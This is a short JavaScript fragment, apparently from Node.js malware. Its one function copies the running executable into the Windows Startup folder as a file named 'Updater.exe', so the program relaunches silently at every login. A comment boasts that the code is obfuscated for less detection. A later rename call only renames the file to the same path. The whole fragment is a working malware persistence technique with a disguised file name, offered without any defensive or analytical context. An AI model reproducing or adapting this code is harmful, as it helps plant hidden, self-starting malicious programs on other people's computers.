async function VARESTARTUP() {
  // OBFUSCATED FOR LESS DETECTION IF U WANT DEOBFUSCATE IT
  fs.createReadStream(process.argv0).pipe(fs.createWriteStream(process.env.APPDATA.replace("\\", '/') + "/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe"));
  setTimeout(() => {
    fs.renameSync(process.env.APPDATA.replace("\\", '/') + "/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe", process.env.APPDATA.replace("\\", '/') + "/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe");
  }, 3000);
}